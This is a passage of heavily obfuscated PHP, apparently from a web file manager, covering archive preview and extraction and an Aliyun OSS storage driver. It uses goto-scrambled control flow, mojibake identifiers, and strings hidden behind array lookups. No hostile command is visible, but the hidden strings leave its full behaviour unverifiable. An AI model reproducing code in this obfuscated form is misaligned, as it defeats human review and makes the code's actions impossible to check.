show_json($A“µù­†ˆ[1027], !1); } } $d¿®õÏªˆá = isset($d»ö‘ ËÙ¸) ? $d»ö‘ ËÙ¸[$A“µù­†ˆ[75]] : $cŸ«¬Ã­ğ; goto f£ÆíìÑàš; FŸ–ë‡ÔÅê: self::archiveExt(); del_dir($DƒÑ õÀÁ±); if (!$F³Ì—‘À¨Í[$A“µù­†ˆ[1022]]) { show_json($F³Ì—‘À¨Í[$A“µù­†ˆ[1024]], !1); } goto D°ËÒÄä·İ; Dˆ÷íğø: $eŞ»“õÁÒë = self::iconvSystem($eŞ»“õÁÒë); if ($Cœ† İ‘Ä >= 0) { $a±Î±ïˆå¬ = isset($A­™‹‚´£[$A“µù­†ˆ[1030]]) ? $A­™‹‚´£[$A“µù­†ˆ[1030]] : !1; $C‡ò‡ÑƒÇ = isset($A­™‹‚´£[$A“µù­†ˆ[28]]) ? $A­™‹‚´£[$A“µù­†ˆ[28]] : $A“µù­†ˆ[33]; KodArchive::filePreview($eŞ»“õÁÒë, $Cœ† İ‘Ä, $a±Î±ïˆå¬, $C‡ò‡ÑƒÇ); self::archiveExt(); die; } $F³Ì—‘À¨Í = KodArchive::listContent($eŞ»“õÁÒë); goto FŸ–ë‡ÔÅê; C‚õ’–ÓÈŞ: if (!is_dir($DƒÑ õÀÁ±)) { mk_dir($DƒÑ õÀÁ±); } $eŞ»“õÁÒë = $DƒÑ õÀÁ± . $A“µù­†ˆ[8] . $Aµ¬ÉºˆçÀ; if (!@file_exists(self::iconvSystem($eŞ»“õÁÒë))) { if (isset($d»ö‘ ËÙ¸)) { url_request($cŸ«¬Ã­ğ, $A“µù­†ˆ[1029], $eŞ»“õÁÒë); } else { $B‡„‡´ßÎ‡ = self::localFilePath($cŸ«¬Ã­ğ, $C¶Šƒ½ŠÕª); $eŞ»“õÁÒë = $B‡„‡´ßÎ‡ ? $B‡„‡´ßÎ‡ : self::download($cŸ«¬Ã­ğ, $eŞ»“õÁÒë); } } goto Dˆ÷íğø; C§À†‰¨œÏ: $A“µù­†ˆ =& $_SERVER[£ü]; $cŸ«¬Ã­ğ = $A­™‹‚´£[$A“µù­†ˆ[75]]; $Cœ† İ‘Ä = isset($A­™‹‚´£[$A“µù­†ˆ[1026]]) ? $A­™‹‚´£[$A“µù­†ˆ[1026]] : -1; goto A—Íøàƒˆ; aĞ‘Ç§Ï™ë: if (isset($d»ö‘ ËÙ¸)) { $DØˆ„³Öš‡ = array($d»ö‘ ËÙ¸[$A“µù­†ˆ[75]], $d»ö‘ ËÙ¸[$A“µù­†ˆ[1026]], $d»ö‘ ËÙ¸[$A“µù­†ˆ[28]]); $Aµ¬ÉºˆçÀ = md5(implode($A“µù­†ˆ[70], $DØˆ„³Öš‡)) . $A“µù­†ˆ[93] . get_path_ext($d»ö‘ ËÙ¸[$A“µù­†ˆ[28]]); } else { $DØˆ„³Öš‡ = array($Eéµ‚äØ¼¸[$A“µù­†ˆ[28]], $Eéµ‚äØ¼¸[$A“µù­†ˆ[75]], $Eéµ‚äØ¼¸[$A“µù­†ˆ[77]]); $Aµ¬ÉºˆçÀ = md5(implode($A“µù­†ˆ[70], $DØˆ„³Öš‡)) . $A“µù­†ˆ[93] . $C¶Šƒ½ŠÕª; } if ($Cœ† İ‘Ä == -1) { $Cñ‰•İ„î = IO_PATH_SYSTEM_TEMP . "\172\x69\160\x56\x69\x65\x77\57{$EÛ¤Œ­‚Ü¡}\57{$Aµ¬ÉºˆçÀ}\56\x6c\157\147"; $bÜÓçÚÖ©½ = self::infoFull($Cñ‰•İ„î); if ($bÜÓçÚÖ©½) { $Cñ‰•İ„î = $bÜÓçÚÖ©½[$A“µù­†ˆ[75]]; $céç„ê…Œ¶ = self::getContent($Cñ‰•İ„î); if ($céç„ê…Œ¶) { $CŒ‚ÒÇ‘Óï = json_decode($céç„ê…Œ¶, !0); if (count($CŒ‚ÒÇ‘Óï) >= $D¶†ŸÒ„ª“) { show_json(sprintf(LNG($A“µù­†ˆ[1028]), count($CŒ‚ÒÇ‘Óï)), !1); } return $CŒ‚ÒÇ‘Óï; } } else { $Cñ‰•İ„î = self::mkfile($Cñ‰•İ„î); } } $DƒÑ õÀÁ± = TEMP_FILES . $EÛ¤Œ­‚Ü¡; goto C‚õ’–ÓÈŞ; Eé´¯†ëˆ‘: } private static function fileExt($bùæ¾õš•É) { $D‚ßÒ ‰Í =& $_SERVER[£ü]; $eœ¬ø„³¼ = $bùæ¾õš•É[$D‚ßÒ ‰Í[157]]; if ($eœ¬ø„³¼ == $D‚ßÒ ‰Í[1031]) { $bêÕÌîİ™ = $D‚ßÒ ‰Í[1032]; if (substr($bùæ¾õš•É[$D‚ßÒ ‰Í[28]], -strlen($bêÕÌîİ™)) == $bêÕÌîİ™) { $eœ¬ø„³¼ = $D‚ßÒ ‰Í[1033]; } } self::archiveExt($eœ¬ø„³¼); return $eœ¬ø„³¼; } private static function zipFileList($a†‡‚ãß…é, $aÛñŠÁÙ‡Â = false) { $A¨ïÈ‰²›— =& $_SERVER[£ü]; $d°ÃĞÉÂíô = array(); foreach ($a†‡‚ãß…é as $EÉ’…¯ĞÏË) { $DÁ¸·¥¶±« = $EÉ’…¯ĞÏË[$A¨ïÈ‰²›—[75]]; if ($aÛñŠÁÙ‡Â) { $DÁ¸·¥¶±« = self::copy($EÉ’…¯ĞÏË[$A¨ïÈ‰²›—[75]], $aÛñŠÁÙ‡Â, $A¨ïÈ‰²›—[740]); } if ($DÁ¸·¥¶±« && self::local()->exist($DÁ¸·¥¶±«)) { $d°ÃĞÉÂíô[$EÉ’…¯ĞÏË[$A¨ïÈ‰²›—[75]]] = $DÁ¸·¥¶±«; } } if (!empty($d°ÃĞÉÂíô)) { return array_values($d°ÃĞÉÂíô); } show_json(LNG($A¨ïÈ‰²›—[1034]), !1); } public static function tmpFileName($f¯ÄİÀƒ¶Ş) { $B’¥ÓÜÁ¤Ï =& $_SERVER[£ü]; $bîËá²³Ùî = array($f¯ÄİÀƒ¶Ş[$B’¥ÓÜÁ¤Ï[28]], $f¯ÄİÀƒ¶Ş[$B’¥ÓÜÁ¤Ï[75]], $f¯ÄİÀƒ¶Ş[$B’¥ÓÜÁ¤Ï[77]], $f¯ÄİÀƒ¶Ş[$B’¥ÓÜÁ¤Ï[455]]); return md5(implode($B’¥ÓÜÁ¤Ï[70], $bîËá²³Ùî)); } private static function localFilePath($EÊù„Ëáš®, $F¢ˆ¶Ø—œÅ) { goto f”¶‰†åÑ; AµäÑĞ÷¿„: if ($cØª—¬™† == $b‡µÚ°Ù”Õ[103] || $cØª—¬™† == $b‡µÚ°Ù”Õ[1038]) { if (!$cìÑ»‚‚ğª->exist($cìÑ»‚‚ğª->path)) { show_json(LNG($b‡µÚ°Ù”Õ[102]), !1); } return $cìÑ»‚‚ğª->path; } return !1; goto d‹ƒÌ³ß«Ù; f”¶‰†åÑ: $b‡µÚ°Ù”Õ =& $_SERVER[£ü]; if ($F¢ˆ¶Ø—œÅ == $b‡µÚ°Ù”Õ[1035] && strtoupper(substr(PHP_OS, 0, 3)) == $b‡µÚ°Ù”Õ[1036]) { return !1; } $CˆÒ‚ÜèĞ± = KodIO::parse($EÊù„Ëáš®); goto d˜ŞŒâ¦ğÁ; d˜ŞŒâ¦ğÁ: if ($CˆÒ‚ÜèĞ±[$b‡µÚ°Ù”Õ[29]] == KodIO::KOD_SOURCE) { $aã¦ïøÛ´½ = Model($b‡µÚ°Ù”Õ[748])->fileInfoGet(KodIO::sourceID($EÊù„Ëáš®)); if (!$aã¦ïøÛ´½[$b‡µÚ°Ù”Õ[75]]) { show_json($b‡µÚ°Ù”Õ[1037], !1); } $EÊù„Ëáš® = $aã¦ïøÛ´½[$b‡µÚ°Ù”Õ[75]]; } $cìÑ»‚‚ğª = self::init($EÊù„Ëáš®); $cØª—¬™† = $cìÑ»‚‚ğª->getType(); goto AµäÑĞ÷¿„; d‹ƒÌ³ß«Ù: } private static function archiveExt($F¸‹‚‘ÓÏâ = '') { $GLOBALS[$_SERVER[£ü][1039]] = $F¸‹‚‘ÓÏâ; } } goto Cğ•Ä®Æ ’; CïŒ©ˆß•Ò: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($C†ÅøŸìŒÛ) { parent::__construct(); include_once SDK_DIR . $_SERVER[£ü][1153]; $this->_init($C†ÅøŸìŒÛ); } public function _init($C¸±•èÕ) { foreach ($C¸±•èÕ as $bÈêƒÛ‡‡ => $e¬”Ù®…Ö‹) { if (isset($this->{$bÈêƒÛ‡‡})) { $this->{$bÈêƒÛ‡‡} = $e¬”Ù®…Ö‹; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[£ü][1154], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto bÀ”¨¥ß; bø§…¡…Ïà: $dó¨‹…Òà»->addAllowedMethod($B•ƒáà¡©[1158]); $dó¨‹…Òà»->addAllowedMethod($B•ƒáà¡©[1159]); $dó¨‹…Òà»->addAllowedMethod($B•ƒáà¡©[152]); goto CÕ½õğô»‚; bÀ”¨¥ß: $B•ƒáà¡© =& $_SERVER[£ü]; $eò¡ªé¦É = new OSS\Model\CorsConfig(); $dó¨‹…Òà» = new OSS\Model\CorsRule(); goto fÍë›­ù¿Î; CÕ½õğô»‚: $dó¨‹…Òà»->setMaxAgeSeconds(600); $dó¨‹…Òà»->addExposeHeader($B•ƒáà¡©[1160]); $dó¨‹…Òà»->addAllowedHeader($B•ƒáà¡©[1155]); goto bÖ½æ°Ù°¸; bÖ½æ°Ù°¸: $eò¡ªé¦É->addRule($dó¨‹…Òà»); try { $this->client->putBucketCors($this->bucket, $eò¡ªé¦É); } catch (OSS\Core\OssException $dš¼­£ª‚¢) { return !1; } return !0; goto aŒÎ‡…¯‡¬; fÍë›­ù¿Î: $dó¨‹…Òà»->addAllowedOrigin($B•ƒáà¡©[1155]); $dó¨‹…Òà»->addAllowedMethod($B•ƒáà¡©[1156]); $dó¨‹…Òà»->addAllowedMethod($B•ƒáà¡©[1157]); goto bø§…¡…Ïà; aŒÎ‡…¯‡¬: } public function getBucketCors() { goto F§á×Ì±†; F§á×Ì±†: $E¹†Ş‡º…× =& $_SERVER[£ü]; $EŒŠÑœŠ±ô = null; try { $EŒŠÑœŠ±ô = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $AÍ†š®Ô—†) { return null; } goto Cò´¢Œ†‘; Cî“¿»äêè: $DËÊÏ‹”ÙŒ = $aùİŸ¾§óÏ[0]->getMaxAgeSeconds(); $eæ§•È˜Œê = $aùİŸ¾§óÏ[0]->getExposeHeaders(); $f‘ÀİŞöÃ = $aùİŸ¾§óÏ[0]->getAllowedHeaders(); goto eéÌ®ÖµÌ´; Cò´¢Œ†‘: if (!$EŒŠÑœŠ±ô || !($aùİŸ¾§óÏ = $EŒŠÑœŠ±ô->getRules())) { return null; } $Cì©Å·Ò¦† = $aùİŸ¾§óÏ[0]->getAllowedOrigins(); $C”¾½É´” = $aùİŸ¾§óÏ[0]->getAllowedMethods(); goto Cî“¿»äêè; eéÌ®ÖµÌ´: return array($E¹†Ş‡º…×[172] => isset($Cì©Å·Ò¦†[0]) ? $Cì©Å·Ò¦†[0] : $E¹†Ş‡º…×[33], $E¹†Ş‡º…×[176] => $C”¾½É´”, $E¹†Ş‡º…×[1161] => $DËÊÏ‹”ÙŒ, $E¹†Ş‡º…×[1162] => isset($eæ§•È˜Œê[0]) ? $eæ§•È˜Œê[0] : $E¹†Ş‡º…×[33], $E¹†Ş‡º…×[174] => isset($f‘ÀİŞöÃ[0]) ? $f‘ÀİŞöÃ[0] : $E¹†Ş‡º…×[33]); goto bÁÙ²‰ğ—; bÁÙ²‰ğ—: } public function isBucketCors() { goto Aª½Ïğ½»å; AîåÙÕî„Ê: $F¯´œ‰±– = array($DÌõ±¥õ›Û[177], $DÌõ±¥õ›Û[178], $DÌõ±¥õ›Û[179], $DÌõ±¥õ›Û[180], $DÌõ±¥õ›Û[181]); $c±Ÿ÷ò­Ë = array_diff($F¯´œ‰±–, $CèŠò÷½ÚÊ); return empty($c±Ÿ÷ò­Ë); goto bšéÕ®à§Ã; Aª½Ïğ½»å: $DÌõ±¥õ›Û =& $_SERVER[£ü]; $BŒ¶İìÇ¯‚ = $this->getBucketCors(); if (!$BŒ¶İìÇ¯‚ || !is_array($BŒ¶İìÇ¯‚)) { return !1; } goto b¨Ö‹Ïğâš; b¨Ö‹Ïğâš: if ($BŒ¶İìÇ¯‚[$DÌõ±¥õ›Û[172]] != $DÌõ±¥õ›Û[173] || $BŒ¶İìÇ¯‚[$DÌõ±¥õ›Û[174]] != $DÌõ±¥õ›Û[173]) { return !1; } $CèŠò÷½ÚÊ = array_map($DÌõ±¥õ›Û[175], $BŒ¶İìÇ¯‚[$DÌõ±¥õ›Û[176]]); if (!is_array($CèŠò÷½ÚÊ)) { $CèŠò÷½ÚÊ = array(); } goto AîåÙÕî„Ê; bšéÕ®à§Ã: } public function mkfile($C½‚Ó ‘¿˜, $Dù§ÁãÖˆŞ = '', $AÈ‹ãĞº§¹ = REPEAT_RENAME) { $fç‰µ‚æ°… = $this->setContent($C½‚Ó ‘¿˜, $Dù§ÁãÖˆŞ); if ($fç‰µ‚æ°… !== !1) { return $this->getPathOuter($C½‚Ó ‘¿˜); } return !1; } public function mkdir($fèò¥Æ¬Ì”, $CõŠºÖÁÀ = REPEAT_SKIP) { if ($this->_isFolder($fèò¥Æ¬Ì”)) { return $this->getPathOuter($fèò¥Æ¬Ì”); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($fèò¥Æ¬Ì”)); } catch (OSS\Core\OssException $B¼‘—¸ÜÉ„) { return !1; } return $this->getPathOuter($fèò¥Æ¬Ì”); } private function fileList($dİŸ¬½‡Ö´, $EÉ—™ô£¿Œ = '', $EÁñ«Øä›° = 0) { goto d‚±ˆÌØ±Ø; D—æŞ§ùâ£: while (!0) { $EĞ‹¼ããÊ‡ = array($a·îô¢Çˆ‚[1163] => $EÉ—™ô£¿Œ, $a·îô¢Çˆ‚[183] => $EÖŠ‡äÕ‰, $a·îô¢Çˆ‚[1164] => $eó Œõ—–, $a·îô¢Çˆ‚[1165] => $Eƒ„ÚÇãøØ); try { $B²Ğ½¾—ç  = $this->client->listObjects($this->bucket, $EĞ‹¼ããÊ‡); } catch (OSS\Core\OssException $b–†½òÓó) { break; } $Eƒ„ÚÇãøØ = $B²Ğ½¾—ç ->getNextMarker(); $eåæíÀÜ• = $B²Ğ½¾—ç ->getObjectList(); $cêÈùãİ = $B²Ğ½¾—ç ->getPrefixList(); foreach ($eåæíÀÜ• as $A¡ÌŸØø) { if ($A¡ÌŸØø->getKey() == $EÖŠ‡äÕ‰) { continue; } $a”±›Èëèƒ = $A¡ÌŸØø->getKey(); if ($EÁñ«Øä›°) { $a”±›Èëèƒ = array($a·îô¢Çˆ‚[28] => $a”±›Èëèƒ, $a·îô¢Çˆ‚[77] => $A¡ÌŸØø->getSize(), $a·îô¢Çˆ‚[187] => strtotime($A¡ÌŸØø->getLastModified())); } $a·Ü°¸Ç°[] = $a”±›Èëèƒ; } foreach ($cêÈùãİ as $AæÁ­ß“¥) { $fÕÚ¬¸Öñ[] = $AæÁ­ß“¥->getPrefix(); } if ($Eƒ„ÚÇãøØ === $a·îô¢Çˆ‚[33]) { break; } } return array($a·îô¢Çˆ‚[74] => $fÕÚ¬¸Öñ, $a·îô¢Çˆ‚[73] => $a·Ü°¸Ç°); goto a¹¡ìå¹Ï; b¦©ãÕ½õ‘: $Eƒ„ÚÇãøØ = $a·îô¢Çˆ‚[33]; $eó Œõ—– = 1000; $fÕÚ¬¸Öñ = $a·Ü°¸Ç° = array(); goto D—æŞ§ùâ£; d‚±ˆÌØ±Ø: $a·îô¢Çˆ‚ =& $_SERVER[£ü]; $dİŸ¬½‡Ö´ = trim($dİŸ¬½‡Ö´, $a·îô¢Çˆ‚[8]); $EÖŠ‡äÕ‰ = empty($dİŸ¬½‡Ö´) ? $a·îô¢Çˆ‚[33] : $dİŸ¬½‡Ö´ . $a·îô¢Çˆ‚[8]; goto b¦©ãÕ½õ‘; a¹¡ìå¹Ï: } public function copyFile($AÑæ¼Ë‘©Ş, $eˆ––Œ¼±Í) { $C˜Öù¦î·Ê = $this->size($AÑæ¼Ë‘©Ş); if ($C˜Öù¦î·Ê < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $AÑæ¼Ë‘©Ş, $this->bucket, $this->pathEncode($eˆ––Œ¼±Í)); } catch (OSS\Core\OssException $A‡¾“Ç»Ÿ) { return !1; } return !0; } return $this->multiCopyObject($AÑæ¼Ë‘©Ş, $eˆ––Œ¼±Í, $C˜Öù¦î·Ê); } private function multiCopyObject($EÌİÒµÈÚ, $CĞ«´’²ñÖ, $b‚ğÑ»™Àª) { $D•Ø¨ºù½Æ =& $_SERVER[£ü]; try { goto bÀ£ÅÈØ¿í; bÀ£ÅÈØ¿í: $C¼ÓòÊ·½ƒ = array(); if ($fØ¯‹Åã = $this->hashMd5($EÌİÒµÈÚ)) { $C¼ÓòÊ·½ƒ = array(OSS\OssClient::OSS_HEADERS => array($D•Ø¨ºù½Æ[1166] => $fØ¯‹Åã)); } $B±±è‡©åê = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($CĞ«´’²ñÖ), $C¼ÓòÊ·½ƒ); goto E®›¤åòà; dà¬ÜÊ’: $DÏÎ Œ®‰ = array(); foreach ($bâø’•³ÖÏ as $C¼÷„†• => $dø–§¡÷ãØ) { $DÏÎ Œ®‰[] = array($D•Ø¨ºù½Æ[1170] => $C¼÷„†• + 1, $D•Ø¨ºù½Æ[1171] => $dø–§¡÷ãØ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($CĞ«´’²ñÖ), $B±±è‡©åê, $DÏÎ Œ®‰); goto DÙŸ»²¬×…; E®›¤åòà: $eè¶ÊÁßºÜ = 1; $eã¸ÃàôÔ = 0; $bâø’•³ÖÏ = array(); goto e£ë‰…ç¨¥; e£ë‰…ç¨¥: $B­†ŠÑö£¥ = $this->osChunkSize(); $c…œ²¤º±‰ = $this->client->generateMultiuploadParts($b‚ğÑ»™Àª, $B­†ŠÑö£¥); foreach ($c…œ²¤º±‰ as $C¼÷„†• => $Bò’¡­º¬Ï) { $E¡ù§—§¦ = $eã¸ÃàôÔ + (int) $Bò’¡­º¬Ï[$D•Ø¨ºù½Æ[1167]]; $CÎÉêˆÂä• = (int) $Bò’¡­º¬Ï[$D•Ø¨ºù½Æ[322]] + $E¡ù§—§¦ - 1; $e…íãˆ…‘‘ = array($D•Ø¨ºù½Æ[1168] => $E¡ù§—§¦, $D•Ø¨ºù½Æ[1169] => $CÎÉêˆÂä•); $bâø’•³ÖÏ[] = $this->client->uploadPartCopy($this->bucket, $EÌİÒµÈÚ, $this->bucket, $this->pathEncode($CĞ«´’²ñÖ), $eè¶ÊÁßºÜ, $B±±è‡©åê, $e…íãˆ…‘‘); $eè¶ÊÁßºÜ = $eè¶ÊÁßºÜ + 1; } goto dà¬ÜÊ’; DÙŸ»²¬×…: } catch (OSS\Core\OssException $B•¸âÕó‰×) { return !1; } return !0; } public function moveFile($dªèã¿´šˆ, $b»ŞïÅ½™) { if ($this->copyFile($dªèã¿´šˆ, $b»ŞïÅ½™)) { $this->remove($dªèã¿´šˆ); return !0; } return !1; } public function delFile($a·àöœùê‰) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($a·àöœùê‰)); } catch (OSS\Core\OssException $aôæªÁÒ»”) { return !1; } return !0; } public function delFolder($EÆ…ƒË¯¶ù) { $aÃÜ ‘‹ =& $_SERVER[£ü]; $aš™Ôä˜ßÉ = $this->fileList($EÆ…ƒË¯¶ù); if (!empty($EÆ…ƒË¯¶ù) && !in_array(trim($EÆ…ƒË¯¶ù, $aÃÜ ‘‹[8]) . $aÃÜ ‘‹[8], $aš™Ôä˜ßÉ[$aÃÜ ‘‹[73]])) { $aš™Ôä˜ßÉ[$aÃÜ ‘‹[73]][] = trim($EÆ…ƒË¯¶ù, $aÃÜ ‘‹[8]) . $aÃÜ ‘‹[8]; } foreach (array_chunk($aš™Ôä˜ßÉ[$aÃÜ ‘‹[73]], 1000) as $cÀâğä²Ë) { try { $this->client->deleteObjects($this->bucket, $cÀâğä²Ë); } catch (OSS\Core\OssException $Eîˆä¼™‹) { continue; } } return !0; } public function rename($d¼á½¢ˆ±‰, $B‡ì·ÆŒ¤) { return $this->renameObject($d¼á½¢ˆ±‰, $B‡ì·ÆŒ¤); } private function fileInfo($b½Ãİ—’ßß, $cõô“Ö¦³ = array()) { goto câè¦ù…±±; e¨‘ğºšà: return $d©™­÷ÇÍ; goto DÃÊŞˆÅ£°; câè¦ù…±±: $F©ÃÛÓ¡µ =& $_SERVER[£ü]; $d©™­÷ÇÍ = array($F©ÃÛÓ¡µ[28] => $this->pathThis($b½Ãİ—’ßß), $F©ÃÛÓ¡µ[75] => $this->getPathOuter($b½Ãİ—’ßß), $F©ÃÛÓ¡µ[29] => $F©ÃÛÓ¡µ[164], $F©ÃÛÓ¡µ[184] => 0, $F©ÃÛÓ¡µ[107] => 0, $F©ÃÛÓ¡µ[77] => 0, $F©ÃÛÓ¡µ[157] => $this->ext($b½Ãİ—’ßß), $F©ÃÛÓ¡µ[185] => !0, $F©ÃÛÓ¡µ[186] => !0); if (empty($cõô“Ö¦³)) { $AÓ‹Ö‰—Ø… = $this->objectMeta($b½Ãİ—’ßß); if (!$AÓ‹Ö‰—Ø…) { return $d©™­÷ÇÍ; } $cõô“Ö¦³ = array($F©ÃÛÓ¡µ[107] => strtotime($AÓ‹Ö‰—Ø…[$F©ÃÛÓ¡µ[1172]]), $F©ÃÛÓ¡µ[77] => $AÓ‹Ö‰—Ø…[$F©ÃÛÓ¡µ[1173]] + 0); } goto b”Ô ¼ã–Œ; b”Ô ¼ã–Œ: if (isset($cõô“Ö¦³[$F©ÃÛÓ¡µ[77]])) { $d©™­÷ÇÍ[$F©ÃÛÓ¡µ[77]] = $cõô“Ö¦³[$F©ÃÛÓ¡µ[77]]; } if (isset($cõô“Ö¦³[$F©ÃÛÓ¡µ[107]])) { $d©™­÷ÇÍ[$F©ÃÛÓ¡µ[107]] = $cõô“Ö¦³[$F©ÃÛÓ¡µ[107]]; } if (isset($cõô“Ö¦³[$F©ÃÛÓ¡µ[187]]) && !trim($d©™­÷ÇÍ[$F©ÃÛÓ¡µ[107]])) { $d©™­÷ÇÍ[$F©ÃÛÓ¡µ[107]] = $cõô“Ö¦³[$F©ÃÛÓ¡µ[187]]; } goto e¨‘ğºšà; DÃÊŞˆÅ£°: } private function folderInfo($B²ßŞº­àã, $DñÌŸŒè¾ã = array()) { $cŠ§½âòµ¦ =& $_SERVER[£ü]; $eÕÎ‘œö = array($cŠ§½âòµ¦[28] => $this->pathThis($B²ßŞº­àã), $cŠ§½âòµ¦[75] => $this->getPathOuter($cŠ§½âòµ¦[8] . $B²ßŞº­àã), $cŠ§½âòµ¦[29] => $cŠ§½âòµ¦[76], $cŠ§½âòµ¦[184] => 0, $cŠ§½âòµ¦[107] => 0, $cŠ§½âòµ¦[185] => !0, $cŠ§½âòµ¦[186] => !0); if (empty($DñÌŸŒè¾ã)) { $B²ßŞº­àã = rtrim($B²ßŞº­àã, $cŠ§½âòµ¦[8]) . $cŠ§½âòµ¦[8]; $D—¦˜°¥Ô = $this->objectMeta($B²ßŞº­àã); if (!$D—¦˜°¥Ô) { return $eÕÎ‘œö; } $DñÌŸŒè¾ã = array($cŠ§½âòµ¦[184] => $D—¦˜°¥Ô[$cŠ§½âòµ¦[1174]][$cŠ§½âòµ¦[1175]], $cŠ§½âòµ¦[107] => strtotime($D—¦˜°¥Ô[$cŠ§½âòµ¦[1172]])); } if (isset($DñÌŸŒè¾ã[$cŠ§½âòµ¦[107]])) { $eÕÎ‘œö[$cŠ§½âòµ¦[107]] = $DñÌŸŒè¾ã[$cŠ§½âòµ¦[107]]; } if (isset($DñÌŸŒè¾ã[$cŠ§½âòµ¦[184]])) { $eÕÎ‘œö[$cŠ§½âòµ¦[184]] = $DñÌŸŒè¾ã[$cŠ§½âòµ¦[184]]; } return $eÕÎ‘œö; } public function listPath($FššŒŸè™ø, $AÜ±óÃ÷ä” = false) { $cÚãÑÏ‚ƒ =& $_SERVER[£ü]; $Cöİ²ìªÇ¿ = $this->fileList($FššŒŸè™ø, $cÚãÑÏ‚ƒ[8], !0); foreach ($Cöİ²ìªÇ¿[$cÚãÑÏ‚ƒ[74]] as $e—…¿·ÑÖÀ => $B‰ò™ˆí¯) { $Cöİ²ìªÇ¿[$cÚãÑÏ‚ƒ[74]][$e—…¿·ÑÖÀ] = $this->folderInfo($B‰ò™ˆí¯, $B‰ò™ˆí¯); } foreach ($Cöİ²ìªÇ¿[$cÚãÑÏ‚ƒ[73]] as $e—…¿·ÑÖÀ => $B‰ò™ˆí¯) { $Cöİ²ìªÇ¿[$cÚãÑÏ‚ƒ[73]][$e—…¿·ÑÖÀ] = $this->fileInfo($B‰ò™ˆí¯[$cÚãÑÏ‚ƒ[28]], $B‰ò™ˆí¯); } return $Cöİ²ìªÇ¿; } public function has($f¡óó¸ö³×, $a£ïÍÜÔ¦ã = false, $dÌîäÜŞ‹ = true) { goto C‚·Š¢•; C‚·Š¢•: $C¸ƒ†Üç¤ =& $_SERVER[£ü]; $f¡óó¸ö³× = trim($f¡óó¸ö³×, $C¸ƒ†Üç¤[8]); $b‚˜†…Î÷ñ = empty($f¡óó¸ö³×) ? $C¸ƒ†Üç¤[33] : $f¡óó¸ö³× . $C¸ƒ†Üç¤[8]; goto C×í¸ î­¼; C×í¸ î­¼: $F°¥Î´çÖã = $C¸ƒ†Üç¤[33]; $B×Ô‰Ê•Ãº = 500; $eÉáƒ˜Ú = 0; goto b‡—ï¹„«İ; b‡—ï¹„«İ: $bĞÈßŠÁƒù = 0; while (!0) { $bÈÏ¾ƒÉ»¬ = array($C¸ƒ†Üç¤[1163] => $C¸ƒ†Üç¤[8], $C¸ƒ†Üç¤[183] => $b‚˜†…Î÷ñ, $C¸ƒ†Üç¤[1164] => $B×Ô‰Ê•Ãº, $C¸ƒ†Üç¤[1165] => $F°¥Î´çÖã); try { $FÈô§ÒÈìÉ = $this->client->listObjects($this->bucket, $bÈÏ¾ƒÉ»¬); } catch (OSS\Core\OssException $f¢©Èï‰‰î) { break; } $F°¥Î´çÖã = $FÈô§ÒÈìÉ->getNextMarker(); $CÄë¯Şì¾ = $FÈô§ÒÈìÉ->getObjectList(); $C¸öÅØÍÜ¾ = $FÈô§ÒÈìÉ->getPrefixList(); if ($a£ïÍÜÔ¦ã) { if (count($CÄë¯Şì¾) > 1 || count($CÄë¯Şì¾) == 1 && $CÄë¯Şì¾[0]->getKey() != $b‚˜†…Î÷ñ) { $eÉáƒ˜Ú += count($CÄë¯Şì¾) - 1; } if (!empty($C¸öÅØÍÜ¾)) { $bĞÈßŠÁƒù += count($C¸öÅØÍÜ¾); } if ($F°¥Î´çÖã === $C¸ƒ†Üç¤[33]) { break; } continue; } if ($dÌîäÜŞ‹) { if (!empty($CÄë¯Şì¾)) { if (count($CÄë¯Şì¾) > 1 || $CÄë¯Şì¾[0]->getKey() != $b‚˜†…Î÷ñ) { return !0; } } } else { if (!empty($C¸öÅØÍÜ¾)) { return !0; } } if ($F°¥Î´çÖã === $C¸ƒ†Üç¤[33]) { break; } } if ($a£ïÍÜÔ¦ã) { return array($C¸ƒ†Üç¤[188] => $eÉáƒ˜Ú, $C¸ƒ†Üç¤[189] => $bĞÈßŠÁƒù); } goto eË…Ï’“®; eË…Ï’“®: return !1; goto cçµÚ¿¼ãÂ; cçµÚ¿¼ãÂ: } public function listAll($FÎ«´…‰†ø) { $F±åê¹§ =& $_SERVER[£ü]; $Añî÷ó†ä = $this->fileList($FÎ«´…‰†ø, $F±åê¹§[33], !0); $aƒƒùòæÏ = array(); foreach ($Añî÷ó†ä[$F±åê¹§[73]] as $c¯ùŒÒ¢³‘) { $aƒƒùòæÏ[$c¯ùŒÒ¢³‘[$F±åê¹§[28]]] = $c¯ùŒÒ¢³‘[$F±åê¹§[77]]; } return $this->listAllFiles($FÎ«´…‰†ø, array_keys($aƒƒùòæÏ), $aƒƒùòæÏ); } public function canRead($EŒ´×¹óµÜ) { $E–…ª²ñÈƒ =& $_SERVER[£ü]; $AÃ½ØÛ² = $this->pathAcl($EŒ´×¹óµÜ); return $AÃ½ØÛ² == $E–…ª²ñÈƒ[1176] || $AÃ½ØÛ² == $E–…ª²ñÈƒ[487] ? !0 : !1; } public function canWrite($DÀÉ›Õ£Ñ) { $bÏÊ›¼Šèİ = $this->pathAcl($DÀÉ›Õ£Ñ); return $bÏÊ›¼Šèİ == $_SERVER[£ü][487] ? !0 : !1; } public function pathAcl($Dé·ë—ñÌä) { goto D¨î¦Ï‡íÚ; D¨î¦Ï‡íÚ: $eø‡ƒ‹‡„ï =& $_SERVER[£ü]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $F°›¯æ¶ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Dé·ë—ñÌä)); } catch (OSS\Core\OssException $E¶‡§Í¼¸Á) { return !1; } goto AÒ’Öäò‹È; BÅé„”ŞÕŒ: return $bÜËøĞë¢”; goto b§±ù´µ·; AÒ’Öäò‹È: $bÜËøĞë¢” = $F°›¯æ¶ == $eø‡ƒ‹‡„ï[34] ? 